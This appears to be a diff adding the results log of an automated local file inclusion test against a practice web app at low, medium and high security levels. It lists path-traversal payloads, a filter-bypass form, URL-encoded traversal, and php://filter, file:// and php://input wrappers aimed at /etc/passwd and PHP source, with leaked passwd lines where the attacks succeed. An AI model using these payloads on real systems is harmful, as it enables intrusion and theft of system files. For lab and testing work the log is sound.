@@ -1,0 +1,124 @@
+==== level=low
+include
+include
+include
+include
+ <<== [low] page=[include.php]
+root:x:0:0:root:/root:/bi
+include
+include
+include
+include
+ <<== [low] page=[/etc/passwd]
+root:x:0:0:root:/root:/bi
+include
+include
+include
+include
+ <<== [low] page=[../../../../../../../etc/passwd]
+include
+include
+include
+include
+include
+include
+include
+ <<== [low] page=[....//....//....//....//....//....//....//etc/passwd]
+include
+include
+include
+include
+include
+include
+include
+ <<== [low] page=[..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd]
+include
+include
+include
+include
+include
+include
+include
+ <<== [low] page=[php://filter/convert.base64-encode/resource=include.php]
+root:x:0:0:root:/root:/bi
+include
+include
+include
+include
+ <<== [low] page=[file:///etc/passwd]
+include
+ <<== [low] page=[php://input]
+==== level=medium
+include
+include
+include
+include
+ <<== [medium] page=[include.php]
+root:x:0:0:root:/root:/bi
+include
+include
+include
+include
+ <<== [medium] page=[/etc/passwd]
+include
+include
+include
+include
+include
+include
+include
+ <<== [medium] page=[../../../../../../../etc/passwd]
+root:x:0:0:root:/root:/bi
+include
+include
+include
+include
+ <<== [medium] page=[....//....//....//....//....//....//....//etc/passwd]
+include
+include
+include
+include
+include
+include
+include
+ <<== [medium] page=[..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd]
+include
+include
+include
+include
+include
+include
+include
+ <<== [medium] page=[php://filter/convert.base64-encode/resource=include.php]
+root:x:0:0:root:/root:/bi
+include
+include
+include
+include
+ <<== [medium] page=[file:///etc/passwd]
+include
+ <<== [medium] page=[php://input]
+==== level=high
+include
+include
+include
+include
+ <<== [high] page=[include.php]
+ERROR
+ <<== [high] page=[/etc/passwd]
+ERROR
+ <<== [high] page=[../../../../../../../etc/passwd]
+ERROR
+ <<== [high] page=[....//....//....//....//....//....//....//etc/passwd]
+ERROR
+ <<== [high] page=[..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd]
+ERROR
+ <<== [high] page=[php://filter/convert.base64-encode/resource=include.php]
+root:x:0:0:root:/root:/bi
+include
+include
+include
+include
+ <<== [high] page=[file:///etc/passwd]
+ERROR
+ <<== [high] page=[php://input]
